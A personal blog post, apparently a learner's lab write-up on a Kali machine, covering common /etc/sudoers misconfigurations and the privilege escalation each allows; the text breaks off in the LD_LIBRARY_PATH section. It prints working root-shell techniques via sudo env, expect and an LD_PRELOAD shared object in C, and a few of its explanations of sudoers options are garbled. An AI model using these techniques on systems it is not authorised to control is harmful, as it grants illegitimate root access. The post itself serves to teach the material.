@@ -1,0 +1,315 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="A simple writeup on common /etc/sudoers misconfigurations and their associated privilege escalation techniques. Simply because I am still very blur about this technique."><title>Becoming a Super Soldier (Common /etc/sudoers misconfigurations)</title><link rel=canonical href=https://trinuro.github.io/p/becoming-a-super-soldier-common-/etc/sudoers-misconfigurations/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="Becoming a Super Soldier (Common /etc/sudoers misconfigurations)"><meta property='og:description' content="A simple writeup on common /etc/sudoers misconfigurations and their associated privilege escalation techniques. Simply because I am still very blur about this technique."><meta property='og:url' content='https://trinuro.github.io/p/becoming-a-super-soldier-common-/etc/sudoers-misconfigurations/'><meta property='og:site_name' content="Froginacup's site"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Linux'><meta property='article:published_time' content='2025-11-09T07:54:25-05:00'><meta property='article:modified_time' content='2025-11-09T07:54:25-05:00'><meta name=twitter:title content="Becoming a Super Soldier (Common /etc/sudoers misconfigurations)"><meta name=twitter:description content="A simple writeup on common /etc/sudoers misconfigurations and their associated privilege escalation techniques. Simply because I am still very blur about this technique."><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_aff73beef7294c1a.jpg width=300 height=299 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>💡</span></figure><div class=site-meta><h1 class=site-name><a href=/>Froginacup's site</a></h1><h2 class=site-description>A place where Froginacup writes his adventures</h2></div></header><ol class=menu-social><li><a href=https://github.com/trinuro target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/projects-and-certificates/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Projects and Certificates</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#background>Background</a></li><li><a href=#default-sudo--l>Default <code>sudo -l</code></a></li><li><a href=#allow-user-to-run-all-commands-as-root>Allow user to run all commands as root</a></li><li><a href=#allow-user-to-run-all-commands-as-another-user-or-group>Allow user to run all commands as another user or group</a></li><li><a href=#allow-user-to-run-specific-commands-as-sudo>Allow user to run specific commands as sudo</a></li><li><a href=#allow-user-to-run-sudo-without-password>Allow user to run sudo without password</a></li><li><a href=#preserve-environment-variables>Preserve Environment Variables</a></li><li><a href=#preserve-selected-environment-variables>Preserve selected Environment Variables</a></li><li><a href=#preserve-selected-environment-variables-2>Preserve selected Environment Variables 2</a></li><li><a href=#references>References</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/personal-research/ style=background-color:#aa2f33;color:#fff>Personal Research</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/becoming-a-super-soldier-common-/etc/sudoers-misconfigurations/>Becoming a Super Soldier (Common /etc/sudoers misconfigurations)</a></h2><h3 class=article-subtitle>A simple writeup on common /etc/sudoers misconfigurations and their associated privilege escalation techniques. Simply because I am still very blur about this technique.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-11-09T07:54:25-05:00>Nov 09, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><h2 id=background>Background</h2><ol><li>To edit <code>/etc/sudoers</code>, use <code>visudo</code><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo visudo
+</span></span></code></pre></td></tr></table></div></div></li><li>To verify current sudo configuration,<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Validate sudoers syntax first
+</span></span><span class=line><span class=cl>sudo visudo -c
+</span></span><span class=line><span class=cl># Force re‑auth then cache credentials
+</span></span><span class=line><span class=cl>sudo -k &amp;&amp; sudo -v
+</span></span><span class=line><span class=cl># Confirm what the user can do
+</span></span><span class=line><span class=cl>sudo -l
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>sudo -k</code>: Remove current cached credentials</li><li><code>sudo -v</code>: Reauthenticate user</li></ul></li></ol><h2 id=default-sudo--l>Default <code>sudo -l</code></h2><ol><li>A user that is created normally would not be able to run <code>sudo</code><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo useradd normaluser
+</span></span><span class=line><span class=cl>sudo passwd normaluser
+</span></span></code></pre></td></tr></table></div></div>When we run sudo,<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>[sudo] password for normaluser: 
+</span></span><span class=line><span class=cl>Sorry, user normaluser may not run sudo on kali.
+</span></span></code></pre></td></tr></table></div></div></li><li>We have to add the user to the <code>sudo</code> group or explicitly define the permissions of the user in order for the user to use <code>sudo</code></li><li>This is the default sudoers file in Kali<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo cat /etc/sudoers <span class=p>|</span> grep -v <span class=s2>&#34;#\|^</span>$<span class=s2>&#34;</span> 
+</span></span><span class=line><span class=cl>Defaults        env_reset
+</span></span><span class=line><span class=cl>Defaults        mail_badpass
+</span></span><span class=line><span class=cl>Defaults        <span class=nv>secure_path</span><span class=o>=</span><span class=s2>&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>
+</span></span><span class=line><span class=cl>Defaults        use_pty
+</span></span><span class=line><span class=cl>root    <span class=nv>ALL</span><span class=o>=(</span>ALL:ALL<span class=o>)</span> ALL
+</span></span><span class=line><span class=cl>%sudo   <span class=nv>ALL</span><span class=o>=(</span>ALL:ALL<span class=o>)</span> ALL
+</span></span><span class=line><span class=cl>@includedir /etc/sudoers.d
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>env_reset</code>: Means environment variables will be reset. Very important because some commands functions differently based on environment variables</li><li><code>mail_badpass</code>: Sends email if there is an authentication error</li><li><code>secure_path</code>: Specify the <code>$PATH</code> env variable for root in <code>sudo</code>. Very important because we may be able to change the binary that is actually executed</li><li><code>use_pty</code>: Uses a virtual terminal. Helps prevent some attacks</li><li><code>root ALL=(ALL:ALL) ALL</code>: Root can run any command as any user and any group</li><li><code>%sudo ALL=(ALL:ALL) ALL</code>: The sudo group can run any command as any user and any group</li></ul></li></ol><h2 id=allow-user-to-run-all-commands-as-root>Allow user to run all commands as root</h2><ol><li>The easiest way is to add the user to the <code>sudo</code> group<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo usermod -aG sudo normaluser
+</span></span></code></pre></td></tr></table></div></div>Output:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>[sudo] password for normaluser: 
+</span></span><span class=line><span class=cl>Matching Defaults entries for normaluser on kali:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+</span></span><span class=line><span class=cl>    use_pty
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User normaluser may run the following commands on kali:
+</span></span><span class=line><span class=cl>    (ALL : ALL) ALL
+</span></span></code></pre></td></tr></table></div></div></li><li>To remove the user from the sudoers group,<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo gpasswd --delete normaluser sudo
+</span></span></code></pre></td></tr></table></div></div></li></ol><h2 id=allow-user-to-run-all-commands-as-another-user-or-group>Allow user to run all commands as another user or group</h2><ol><li>To achieve this, we need to edit the sudoers file directly<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># User privilege specification</span>
+</span></span><span class=line><span class=cl>root    <span class=nv>ALL</span><span class=o>=(</span>ALL:ALL<span class=o>)</span> ALL
+</span></span><span class=line><span class=cl>normaluser <span class=nv>ALL</span><span class=o>=(</span>kali:kali<span class=o>)</span> ALL
+</span></span></code></pre></td></tr></table></div></div></li></ol><ul><li>In this case, the user <code>normaluser</code> can run commands as user and group <code>kali</code></li></ul><ol start=2><li>There is a privilege escalation opportunity if <code>kali</code> is part of <code>sudo</code> groups/ have extra sudo privileges<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries for normaluser on kali:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+</span></span><span class=line><span class=cl>    use_pty
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User normaluser may run the following commands on kali:
+</span></span><span class=line><span class=cl>    (kali : kali) ALL
+</span></span><span class=line><span class=cl>$ sudo -u kali bash
+</span></span><span class=line><span class=cl>┌──(kali㉿kali)-[~/learning_materials/learn_sudoers]
+</span></span><span class=line><span class=cl>└─$ groups
+</span></span><span class=line><span class=cl>kali sudo
+</span></span></code></pre></td></tr></table></div></div></li></ol><h2 id=allow-user-to-run-specific-commands-as-sudo>Allow user to run specific commands as sudo</h2><ol><li>To achieve it, modify the sudoers like this<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># User privilege specification
+</span></span><span class=line><span class=cl>root    ALL=(ALL:ALL) ALL
+</span></span><span class=line><span class=cl>normaluser ALL=(root:root) /usr/bin/env
+</span></span></code></pre></td></tr></table></div></div></li></ol><ul><li><code>normaluser</code> can run <code>/usr/bin/env</code> as root</li></ul><ol start=2><li>Depending on the binary, it can be a privilege escalation vulnerability/opportunity<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries for normaluser on kali:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User normaluser may run the following commands on kali:
+</span></span><span class=line><span class=cl>    (root : root) /usr/bin/env
+</span></span><span class=line><span class=cl>$ sudo env /bin/bash
+</span></span><span class=line><span class=cl>┌──(root㉿kali)-[/home/kali/learning_materials/learn_sudoers]
+</span></span><span class=line><span class=cl>└─# 
+</span></span></code></pre></td></tr></table></div></div></li></ol><ul><li>Refer <a class=link href=https://gtfobins.github.io/ target=_blank rel=noopener>https://gtfobins.github.io/</a></li></ul><h2 id=allow-user-to-run-sudo-without-password>Allow user to run sudo without password</h2><ol><li>To do so, specify the <code>NOPASSWD</code> rule<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># User privilege specification
+</span></span><span class=line><span class=cl>root    ALL=(ALL:ALL) ALL
+</span></span><span class=line><span class=cl>normaluser ALL=(root) NOPASSWD: /usr/bin/expect
+</span></span></code></pre></td></tr></table></div></div><ul><li>We can now run commands without knowing the password of <code>normaluser</code>.</li><li>Only use this option in a controlled setting</li><li>It is usually used in automation scripts</li></ul></li><li>Still a privilege escalation opportunity.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries for normaluser on kali:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+</span></span><span class=line><span class=cl>    use_pty
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User normaluser may run the following commands on kali:
+</span></span><span class=line><span class=cl>    (root) NOPASSWD: /usr/bin/expect
+</span></span><span class=line><span class=cl>$ sudo /usr/bin/expect -c &#39;spawn /bin/sh;interact&#39;
+</span></span><span class=line><span class=cl>spawn /bin/sh
+</span></span><span class=line><span class=cl># id
+</span></span><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root)
+</span></span></code></pre></td></tr></table></div></div></li></ol><h2 id=preserve-environment-variables>Preserve Environment Variables</h2><ol><li>This is an insecure configuration as a lot of binaries works differently based on the presence of certain environment variables and we can preload certain Shared Objects.</li><li>To preserve environment variables except $PATH,<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>Defaults:!normaluser env_reset
+</span></span><span class=line><span class=cl><span class=c1># ...</span>
+</span></span><span class=line><span class=cl>Defaults:normaluser !env_reset
+</span></span><span class=line><span class=cl>Defaults:normaluser <span class=nv>env_delete</span><span class=o>+=</span>PATH
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># User privilege specification</span>
+</span></span><span class=line><span class=cl>root    <span class=nv>ALL</span><span class=o>=(</span>ALL:ALL<span class=o>)</span> ALL
+</span></span><span class=line><span class=cl>normaluser <span class=nv>kali</span><span class=o>=(</span>root<span class=o>)</span> SETENV: /usr/bin/ls -la
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>Defaults:normaluser</code>: This configuration affects normaluser only</li><li><code>!env_reset</code>: Reset environment variables</li><li><code>env_delete+=PATH</code>: Don&rsquo;t reset the PATH variable. It prevents other bypasses</li><li><code>SETENV</code> is required because Linux does not allow us to set <code>LD_PRELOAD</code>, <code>LD_LIBRARY_PATH</code> or other dangerous variables
+Output:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries for normaluser on kali:
+</span></span><span class=line><span class=cl>    mail_badpass,
+</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+</span></span><span class=line><span class=cl>    !env_reset, env_delete+=PATH, use_pty
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User normaluser may run the following commands on
+</span></span><span class=line><span class=cl>        kali:
+</span></span><span class=line><span class=cl>    (root) SETENV: /usr/bin/ls -la
+</span></span></code></pre></td></tr></table></div></div></li><li>Although <code>ls -la</code> do not have a privilege escalation opportunity, the fact that environment variables are kept allows shared object exploit.
+First, create a file called <code>root.c</code><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>_init</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl><span class=nf>unsetenv</span><span class=p>(</span><span class=s>&#34;LD_PRELOAD&#34;</span><span class=p>);</span> <span class=c1>// important to prevent infinite loops apparently
+</span></span></span><span class=line><span class=cl><span class=nf>setgid</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nf>setuid</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div>Compile it as a shared object.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>gcc -fPIC -shared -o root.so root.c -nostartfiles
+</span></span></code></pre></td></tr></table></div></div>Then, pass <code>LD_PRELOAD</code> as an environment variable when calling the binary. This loads the SO, which is then executed like any executable.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=n>sudo</span><span class=w> </span><span class=n>LD_PRELOAD</span><span class=o>=`</span><span class=n>pwd</span><span class=o>`/</span><span class=n>root</span><span class=p>.</span><span class=n>so</span><span class=w> </span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>ls</span><span class=w> </span><span class=o>-</span><span class=n>la</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div>Output:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=err>$</span><span class=w> </span><span class=n>sudo</span><span class=w> </span><span class=n>LD_PRELOAD</span><span class=o>=`</span><span class=n>pwd</span><span class=o>`/</span><span class=n>root</span><span class=p>.</span><span class=n>so</span><span class=w> </span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>ls</span><span class=w> </span><span class=o>-</span><span class=n>la</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>root</span><span class=o>@</span><span class=n>kali</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>kali</span><span class=o>/</span><span class=n>learning_materials</span><span class=o>/</span><span class=n>learn_sudoers</span><span class=c1># 
+</span></span></span></code></pre></td></tr></table></div></div></li><li>Reflection: This is interesting as I swear previously the SETENV flag was not required for this type of privilege escalation</li></ol><h2 id=preserve-selected-environment-variables>Preserve selected Environment Variables</h2><ol><li>To preserve only certain environment variables (safer),<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>Defaults env_reset
+</span></span><span class=line><span class=cl>Defaults:normaluser <span class=nv>env_keep</span><span class=o>+=</span>LD_LIBRARY_PATH
+</span></span><span class=line><span class=cl><span class=c1># User privilege specification</span>
+</span></span><span class=line><span class=cl>normaluser <span class=nv>kali</span><span class=o>=(</span>root<span class=o>)</span> /home/kali/learning_materials/learn_sudoers/test2
+</span></span></code></pre></td></tr></table></div></div>Output:<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries for normaluser on kali:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+</span></span><span class=line><span class=cl>    env_keep+=LD_LIBRARY_PATH, use_pty
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User normaluser may run the following commands on kali:
+</span></span><span class=line><span class=cl>    (root) /home/kali/learning_materials/learn_sudoers/test2
+</span></span></code></pre></td></tr></table></div></div></li><li>This configuration is unfortunately still vulnerable to a privilege escalation technique.
+Identify one of the linked libraries in use.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
